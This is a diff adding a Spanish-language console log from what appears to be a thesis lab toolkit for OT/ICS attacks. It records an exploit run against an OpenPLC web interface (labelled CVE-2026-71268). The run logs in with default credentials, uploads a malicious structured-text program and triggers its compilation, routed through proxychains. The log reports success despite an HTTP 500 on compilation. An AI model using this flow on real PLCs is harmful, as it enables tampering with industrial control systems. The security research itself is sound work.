@@ -1,0 +1,24 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - CVE-2026-71268 (subida + compilación de .st)
+======================================================================
+  Fecha      : 2026-10-12 13:19:42
+  Objetivo   : 192.168.10.10:8080 prog=CVE-2026-71268-PoC
+  MITRE ICS  : T0884
+======================================================================
+$ proxychains python3 -m modules._cli.openplc_cli cve_2026_71268 --target 192.168.10.10 --port 8080 --user openplc --password openplc --prog-name CVE-2026-71268-PoC --prog-descr PoC TFM --st-file /ataques/work/malicioso.st
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 302
+[+] Sesión establecida.
+[*] POST http://192.168.10.10:8080/upload-program-action (prog_file=malicioso.st)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+[*] GET http://192.168.10.10:8080/compile-program?file=malicioso.st
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 500
+[+] Flujo completado. Revisa el dashboard del PLC para verificar el programa cargado.
+[=] Código de salida: 0
